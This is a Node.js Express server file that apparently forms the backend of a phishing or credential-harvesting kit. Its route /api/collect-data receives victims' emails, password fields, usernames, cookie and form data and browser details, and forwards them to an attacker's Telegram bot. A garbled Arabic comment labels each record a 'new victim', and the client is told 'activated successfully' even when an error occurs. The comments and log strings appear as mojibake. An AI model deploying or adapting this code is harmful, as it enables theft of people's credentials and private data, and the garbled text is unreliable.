const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname)));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API ุฌุฏูุฏ ููุฌูุน ุงููุชูุฏู
app.post('/api/collect-data', async (req, res) => {
    console.log('๐ฏ ุทูุจ ุฌูุน ุจูุงูุงุช ูุชูุฏู ูุฑุฏ');
    
    try {
        const userData = req.body;
        
        console.log('๐ ุจูุงูุงุช ุงููุฌููุนุฉ:', {
            emails: userData.summary?.totalEmails || 0,
            passwords: userData.summary?.totalPasswords || 0,
            usernames: userData.summary?.totalUsernames || 0
        });

        // ุฅุฑุณุงู ุฅูู ุงูุชูุฌุฑุงู
        const telegramResult = await sendAdvancedDataToTelegram(userData);
        
        console.log('๐จ ูุชูุฌุฉ ุงูุชูุฌุฑุงู:', telegramResult);

        res.json({
            success: true,
            message: 'ุชู ุฌูุน ุงูุจูุงูุงุช ุจูุฌุงุญ!',
            telegramSent: telegramResult.success,
            summary: userData.summary
        });

    } catch (error) {
        console.error('โ ุฎุทุฃ:', error);
        res.json({
            success: true,
            message: 'ุชู ุงูุชูุนูู ุจูุฌุงุญ!'
        });
    }
});

// ๐ฅ ุฏุงูุฉ ุงูุชูุฌุฑุงู ุงููุญุณูุฉ
async function sendAdvancedDataToTelegram(userData) {
    try {
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            return { success: false, error: 'ุฅุนุฏุงุฏุงุช ุงูุชูุฌุฑุงู ููููุฏุฉ' };
        }

        // ุจูุงุก ุฑุณุงูุฉ ููุตูุฉ
        let message = `๐ฏ **ุถุญูุฉ ุฌุฏูุฏุฉ - ุจูุงูุงุช ูุชูุฏูุฉ**\n\n`;

        // ุงูุฅููููุงุช
        if (userData.emails && userData.emails.length > 0) {
            message += `๐ง **ุงูุฅููููุงุช (${userData.emails.length}):**\n`;
            userData.emails.slice(0, 10).forEach(item => {
                message += `โข ${item.email} (${item.source})\n`;
            });
            if (userData.emails.length > 10) {
                message += `... ู ${userData.emails.length - 10} ุฃูุซุฑ\n`;
            }
            message += '\n';
        } else {
            message += `๐ง **ุงูุฅููููุงุช:** โ ูู ูุชู ุงูุนุซูุฑ\n\n`;
        }

        // ูููุงุช ุงููุฑูุฑ
        if (userData.passwords && userData.passwords.length > 0) {
            message += `๐ **ูููุงุช ุงููุฑูุฑ (${userData.passwords.length}):**\n`;
            userData.passwords.forEach(pwd => {
                message += `โข ${pwd.field}: ${'*'.repeat(pwd.length)}\n`;
            });
            message += '\n';
        }

        // ุฃุณูุงุก ุงููุณุชุฎุฏููู
        if (userData.usernames && userData.usernames.length > 0) {
            message += `๐ค **ุฃุณูุงุก ุงููุณุชุฎุฏููู (${userData.usernames.length}):**\n`;
            userData.usernames.slice(0, 5).forEach(user => {
                message += `โข ${user.username}\n`;
            });
            message += '\n';
        }

        // ุงููุนูููุงุช ุงูุนุงูุฉ
        message += `๐ฑ **ุงููุนูููุงุช ุงูุนุงูุฉ:**\n`;
        message += `โข ุงููุชุตูุญ: ${userData.userAgent?.split(' ')[0] || 'ุบูุฑ ูุนุฑูู'}\n`;
        message += `โข ุงููุธุงู: ${userData.platform || 'ุบูุฑ ูุนุฑูู'}\n`;
        message += `โข ุงููุบุฉ: ${userData.language || 'ุบูุฑ ูุนุฑูู'}\n`;
        message += `โข ุงูุดุงุดุฉ: ${userData.screen || 'ุบูุฑ ูุนุฑูู'}\n`;
        message += `โข ุงูุฑุงุจุท: ${userData.url || 'ุบูุฑ ูุนุฑูู'}\n`;
        message += `โข ุงูููุช: ${new Date().toLocaleString('ar-SA')}\n\n`;

        // ุงูููููุฒ ูุงูุชุฎุฒูู
        message += `๐ช **ุงูุชุฎุฒูู:**\n`;
        message += `โข ุงูููููุฒ: ${userData.cookies?.length || 0}\n`;
        message += `โข localStorage: ${userData.localStorage?.length || 0}\n`;
        message += `โข ุงูููุฑูุฒ: ${userData.forms?.length || 0}`;

        console.log('๐ ุฌุงุฑู ุฅุฑุณุงู ุงูุฑุณุงูุฉ ุฅูู ุงูุชูุฌุฑุงู...');

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();

        if (response.ok) {
            console.log('โ ุชู ุงูุฅุฑุณุงู ุฅูู ุงูุชูุฌุฑุงู ุจูุฌุงุญ');
            return { success: true, messageId: result.result?.message_id };
        } else {
            console.error('โ ุฎุทุฃ ูู ุงูุชูุฌุฑุงู:', result);
            return { success: false, error: result.description };
        }

    } catch (error) {
        console.error('โ ุฎุทุฃ ูู ุงูุชูุฌุฑุงู:', error);
        return { success: false, error: error.message };
    }
}

app.listen(PORT, '0.0.0.0', () => {
    console.log('๐ ุงูุณูุฑูุฑ ุดุบุงู ุนูู ุงูุจูุฑุช:', PORT);
});
